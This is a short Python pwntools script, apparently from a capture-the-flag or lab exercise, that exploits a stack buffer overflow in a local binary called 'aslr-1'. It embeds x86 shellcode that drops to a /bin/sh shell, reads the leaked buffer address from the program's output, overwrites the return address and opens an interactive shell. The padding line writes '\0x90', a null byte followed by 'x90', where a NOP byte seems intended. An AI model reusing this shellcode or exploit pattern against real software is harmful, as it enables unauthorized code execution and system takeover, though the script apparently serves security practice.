#! /usr/bin/env python



from pwn import *
import os

shellcode = "j2X\xcd\x80\x89\xc3\x89\xc1jGX\xcd\x801\xdb1\xc9j\x0bXShn/shh//bi\x89\xe3\xcd\x80"

fname = "./aslr-1"

p = process (fname)
#print(p.recv())
output = p.recv()
word = (output.split())
buf_addr = word[4]
print (buf_addr)

buf = shellcode

while len(buf) < 0x8c:
    buf = buf + "\0x90"

buf += p32(int(buf_addr,16))

p.sendline(buf)

#print(d)

p.interactive()


